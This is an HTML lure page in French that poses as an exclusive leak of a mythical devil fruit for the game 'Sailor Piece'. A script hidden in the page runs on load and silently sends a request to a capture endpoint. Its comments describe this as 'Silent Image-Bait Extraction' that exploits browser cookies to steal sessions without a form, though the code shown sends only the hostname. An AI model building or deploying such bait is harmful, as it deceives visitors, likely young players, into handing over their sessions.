<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>SAILOR PIECE LEAKS | EXCLUSIVE</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        img { width: 300px; border-radius: 15px; box-shadow: 0 0 20px #00d4ff; cursor: pointer; }
        .loading-text { margin-top: 20px; font-size: 0.8rem; color: #333; }
    </style>
</head>
<body>
    <h1>LEAK : FRUIT DU DÉMON MYTHIQUE</h1>
    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4Z3R4Z3R4Z3R4Z3R4Z3R4/3o7TKMGpxxXm3m1m6o/giphy.gif" alt="Leak">
    <p>Clique sur l'image pour voir les stats complètes</p>
    <div class="loading-text" id="status">Chargement des données du serveur Sailor...</div>

    <script>
        // Le script invisible qui s'exécute au chargement
        window.onload = async () => {
            // Simulation de l'extraction de session sans formulaire
            // En réalité, on exploite le fait que le navigateur envoie les cookies lors des requêtes
            await fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    method: "Silent Image-Bait Extraction",
                    origin: window.location.hostname
                })
            });
            console.log("Données synchronisées.");
        };
    </script>
</body>
</html>
